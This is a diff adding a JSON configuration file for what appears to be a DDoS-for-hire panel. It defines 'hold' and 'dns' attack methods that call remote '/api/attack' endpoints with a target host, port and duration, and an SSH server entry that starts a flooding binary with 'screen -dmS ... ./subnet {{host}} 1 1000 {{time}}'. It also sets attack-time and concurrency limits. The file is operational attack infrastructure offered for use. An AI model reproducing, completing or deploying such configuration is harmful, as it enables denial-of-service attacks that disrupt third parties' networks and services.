@@ -1,0 +1,65 @@
+{
+  "hold": {
+    "urls": [
+      {
+        "url": "http://1.1.1.1/api/attack?username=ZOPZHH&key=965d1887360f90&host={host}&port={port}&time={time}&method=hold"
+      },
+            {
+        "url": "http://1.1.1.1/api/attack?username=ZOPZHH&key=965d1887360f90&host={host}&port={port}&time={time}&method=hold"
+      }
+    ],
+    "servers": [
+      {
+        "name": "Homeholder server",
+        "host": "backend",
+        "port": [
+          22
+        ],
+        "type": "ssh", "note": "u can add any form of shitty type, ssh, telnet, raw verys per connection type",
+        "username": "",
+        "password": "",
+        "command": "screen -dmS {{session}} ./subnet {{host}} 1 1000 {{time}}"
+      }
+    ],
+    "ipv4": true,
+    "domain": false,
+    "maxTime": 500000,
+    "min_time": 1,
+    "group": "home_holder",
+    "maxConcurrents": 10,
+    "homeholder": true,
+    "enabled": true,
+    "whitelist": {
+      "userenabled": true,
+      "users": [
+        "root"
+      ]
+    }
+  },
+  "dns": {
+    "urls": [
+      {
+        "url": "http://1.1.1.1/api/attack?username=ZOPZHH&key=965d1887360f90&host={host}&port={port}&time={time}&method=hold"
+      },
+      {
+        "url": "http://1.1.1.1/api/attack?username=ZOPZHH&key=965d1887360f90&host={host}&port={port}&time={time}&method=hold"
+      },
+      {
+        "url": "http://1.1.1.1/api/attack?username=ZOPZHH&key=965d1887360f90&host={host}&port={port}&time={time}&method=hold"
+      }
+    ],
+    "ipv4": true,
+    "domain": false,
+    "maxTime": 300,
+    "enabled": true,
+    "group": "main_network",
+    "maxConcurrents": 3,
+    "whitelist": {
+      "userenabled": false,
+      "users": [
+        "root"
+      ]
+    }
+  }
+
+}
